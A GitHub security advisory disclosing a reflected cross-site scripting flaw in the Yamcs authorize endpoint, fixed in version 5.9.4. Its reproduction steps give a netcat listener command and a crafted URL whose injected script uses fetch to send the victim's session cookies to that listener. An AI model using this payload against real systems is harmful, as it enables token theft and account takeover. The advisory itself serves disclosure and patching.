# [M] Yamcs has Reflected XSS in the URL of the Authorize Endpoint

## Summary
Severity: Medium
Advisory: GHSA-rxpg-wjf8-qv9c
CVE: CVE-2026-55549
CWE: CWE-79
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-rxpg-wjf8-qv9c
Type: github-advisory

## Affected
- Maven: `org.yamcs:yamcs-core` — affected >=0 <5.9.4

## Details
### Attack type: 
Unauthenticated remote  

### Impact: 
Attackers can execute arbitrary JavaScript in a user's browser, including obtaining a user's session token and refresh token.

### Affected components: authorize.html, AuthHandler.java, HandlerContext.java

A Reflected Cross-Site Scripting vulnerability exists in Yamcs <=5.8.6, allowing an attacker to execute arbitrary JavaScript in a Yamcs user's browser. This vulnerability can be exploited to exfiltrate a logged-in user's access token and send it to a remote server, leading to the takeover of the user's account.

Using a specially crafted URL, you are able to execute a JavaScript `alert()` call in the browser:

<img width="1794" height="816" alt="image" src="https://github.com/user-attachments/assets/4a5b6aa4-bceb-4b3d-bc5d-3dac0895ff2e" />

You then use JavaScript to obtain the user's cookies and display them in the alert:

<img width="1794" height="1290" alt="image" src="https://github.com/user-attachments/assets/6c6d2837-db77-409a-a66d-0d2e4edd5435" />

Finally, use the `fetch` function to send the user's cookies to a remote server which we controlled:

<img width="2370" height="1025" alt="image" src="https://github.com/user-attachments/assets/2989fc79-6ca0-4256-afc4-71d44d9923b8" />

Now you can set these cookies in our own browser and login to Yamcs as the user.

## Steps to Reproduce
1. Start Yamcs
2. Login as a user
3. In a terminal, start a netcat listener:

```
nc -nlvp 8888
```

4. Paste the following URL payload in the browser

```
http://localhost:8090/auth/authorize?client_id=yamcs-web&state=Lw&response_mode=query&response_type=code&scope=openid&redirect_uri=http%3A%2F%2Flocalhost:8090%2Fcbi0i7y"><script>fetch(`http://localhost:8888?c=${document.cookie}`)<%2Fscript>ekuou
```

5. You will receive a connection on your netcat listener containing the user's access token and refresh token.

## Acknowledgements
This vulnerability was discovered by Abderrahim Dahmani while solving a STARPWN 2025 CTF challenge at DEFCON 33 offered by VisionSpace Technologies.

## References
- https://github.com/yamcs/yamcs/security/advisories/GHSA-rxpg-wjf8-qv9c
- https://github.com/yamcs/yamcs/commit/4d47d5cdcf5d92c2c5bbbc19feada422923332e3
- https://github.com/yamcs/yamcs
- https://github.com/yamcs/yamcs/releases/tag/yamcs-5.9.4
